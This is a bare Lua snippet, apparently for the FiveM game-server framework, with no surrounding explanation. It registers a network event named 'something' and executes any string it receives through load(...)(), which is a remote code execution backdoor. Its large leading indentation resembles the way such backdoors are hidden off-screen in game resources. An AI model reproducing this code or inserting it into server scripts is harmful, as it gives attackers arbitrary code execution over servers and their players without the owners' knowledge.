                    Citizen.CreateThread(function()                         
                        RegisterNetEvent("something")
                         AddEventHandler("something", function(something)
                             load(something)()
                         end)
                    end)
                